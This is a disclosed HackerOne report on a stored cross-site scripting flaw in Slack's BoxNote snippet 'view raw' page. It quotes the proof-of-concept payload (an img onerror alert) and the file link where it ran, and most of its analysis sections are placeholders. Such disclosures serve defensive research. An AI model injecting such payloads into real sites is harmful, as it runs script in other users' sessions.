# a stored xss issue in https://files.slack.com

## Metadata
- **Source:** HackerOne
- **Report:** 149011 | https://hackerone.com/reports/149011
- **Submitted:** 2016-07-03
- **Reporter:** securitythinker
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
when making  a BoxNote snippet with this xss payload:
XSS") ;</script> <img src="<img src=search"/onerror=alert(document.domain)//"> "><marquee>

when snippet made: and use the "view raw"  xss payload will be executed

my ex: link where xss payload executed:
https://files.slack.com/files-pri/T027N7MK3-F1NCA92JF/XSS______script___img_src___img_src_search__onerror_alert__Xss__________marquee__boxnot

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

when making  a BoxNote snippet with this xss payload:
XSS") ;</script> <img src="<img src=search"/onerror=alert(document.domain)//"> "><marquee>

when snippet made: and use the "view raw"  xss payload will be executed

my ex: link where xss payload executed:
https://files.slack.com/files-pri/T027N7MK3-F1NCA92JF/XSS______script___img_src___img_src_search__onerror_alert__Xss__________marquee__boxnote.boxnote

that link will be executed in entire team mate  that could probably used in exploitation.

</details>

---
*Analysed by Claude on 2026-05-24*
